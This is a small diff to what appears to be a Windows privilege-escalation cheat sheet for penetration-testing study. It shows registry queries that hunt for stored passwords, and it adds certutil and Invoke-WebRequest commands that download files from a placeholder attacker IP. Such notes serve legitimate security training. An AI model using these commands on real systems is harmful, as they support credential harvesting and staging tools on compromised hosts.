@@ -11,4 +11,10 @@
 12.  reg query HKLM /f password /t REG_SZ /s
 13.  reg query HKCU /f password /t REG_SZ /s
 
+
+
+# File Transfers #
+1. certutil -urlcache -split -f http://192.168.XXX.XXX:8000/test.txt test.txt'
+2. Invoke-WebRequest -Uri http://192.168.XXX.XXX:8000/test.txt -Outfile test.txt
+
 Great Resource: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
